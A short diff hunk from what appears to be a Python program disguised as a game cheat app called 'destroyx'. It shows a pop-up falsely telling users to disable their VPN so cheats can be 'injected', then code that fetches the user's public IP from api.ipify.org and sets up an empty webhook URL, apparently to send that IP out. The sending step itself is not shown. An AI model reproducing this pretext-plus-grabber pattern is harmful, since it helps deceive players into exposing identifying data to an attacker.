@@ -14,11 +14,6 @@ def load():
 
 # Window settings
 messagebox.showinfo("No vpn", "We use a third party api to inject the cheats and the api does not work if vpn is active.Sorry you have to do this as destroyx is not a modified client its a app not a client so we have to use a api ")
-# Import all the needed packages 
-import socket
-from requests import get
-import requests
-import os 
 # Make the variables
 ip = get('https://api.ipify.org').text
 webhookURL = ''
